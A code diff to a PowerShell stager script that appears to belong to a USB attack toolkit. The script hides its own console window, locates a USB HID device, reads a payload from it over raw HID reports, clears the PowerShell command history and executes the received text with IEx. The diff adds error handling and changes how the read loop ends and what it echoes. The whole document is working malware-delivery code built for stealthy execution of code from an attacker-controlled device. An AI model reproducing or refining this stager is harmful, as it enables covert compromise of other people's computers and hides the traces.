@@ -25,7 +25,7 @@ namespace n {
 '.Replace('%',[char]34)
 Add-Type -TypeDefinition $cs
 function stage() {
-	[n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6)
+	$null = [n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6)
 	$devs = gwmi Win32_USBControllerDevice
 	foreach ($dev in $devs) {
 		$wmidev = [wmi]$dev.Dependent
@@ -33,28 +33,33 @@ function stage() {
 			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
 		}
 	}
-	$f = [n.w]::o($fn)
+	try {
+		$f = [n.w]::o($fn)
     $g = 0
     $e = 0
     $s = New-Object IO.MemoryStream
     do {
-    	$b = New-Object Byte[] ($M+1)
-        $f.Write($b, 0, $M+1)
-   	    $r = $f.Read($b, 0, $M+1)
-        if ($b[1] -ge 2) {
-            $o = 0
-            if ($e -eq 0) {
-                $e = ($b[2]*256)+$b[3]
-                $o = 2
-            }
-            $s.Write($b, $o+2, $b[1]-$o)
-            $g+=$b[1]-$o
-            [System.Console]::WriteLine([String]::Format('{0} of {1}',$g, $e))
-        }
-    } while ($g -lt $e)
-	clhy
-	IEx ([Text.Encoding]::ASCII).GetString($s.ToArray())
+			$b = New-Object Byte[] ($M+1)
+			$b[2] = 2
+			$f.Write($b, 0, $M+1)
+			$r = $f.Read($b, 0, $M+1)
+			if ($b[1] -ge 2) {
+				$o = 0
+				if ($e -eq 0) {
+					$e = ($b[2]*256)+$b[3]
+					$o = 2
+				}
+				$s.Write($b, $o+2, $b[1]-$o)
+				$g+=$b[1]-$o
+				[System.Console]::Write($b, $o+2, $b[1]-$o)
+				# [System.Console]::WriteLine([String]::Format('{0} of {1}',$g, $e))
+			}
+    } while ($g -lt $e -or $e -eq 0)
+		clhy
+		IEx ([Text.Encoding]::ASCII).GetString($s.ToArray())
+	} catch {
+		echo $_.Exception|format-list -force
+	}
 	exit
 }
 stage
-
